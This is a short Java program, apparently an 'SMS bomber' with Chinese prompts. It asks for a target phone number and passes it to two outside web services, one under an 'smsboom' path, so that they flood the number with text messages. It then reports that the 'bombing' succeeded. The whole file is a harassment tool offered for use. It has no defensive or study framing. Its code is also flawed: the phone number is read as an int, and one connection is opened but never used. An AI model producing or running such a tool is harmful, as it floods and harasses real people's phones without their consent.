
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.io.DataOutputStream;
import java.net.MalformedURLException;
import java.net.Socket;

 class t5 {
    public static void main(String[] args) throws IOException, InterruptedException {
		System.out.println("===请输入要轰炸的手机号===");
		Scanner dxhz = new Scanner(System.in);
		System.out.print("Root@HackTools：>");
		int tel = dxhz.nextInt();
		String url = "http://n103.top:84/smsboom/index.php?hm="+tel;
		String url1 = "https://run.ialtone.xyz/message/index.php?hm="+tel;
		System.out.println("已对该手机号"+tel+"进行轰炸");
		// 打开URL
		URL u = new URL(url);
		URL u1 = new URL(url1);
		// 打开连接
		BufferedReader l = new BufferedReader(new InputStreamReader(u.openStream()));
		BufferedReader s = new BufferedReader(new InputStreamReader(u1.openStream()));
		// 读取网页内容
		String line;
		while ((line = l.readLine()) != null) {
			System.out.println("轰炸成功，请稍等几分钟测试效果");
		}
		// 关闭连接
		l.close();
                }
	}
	
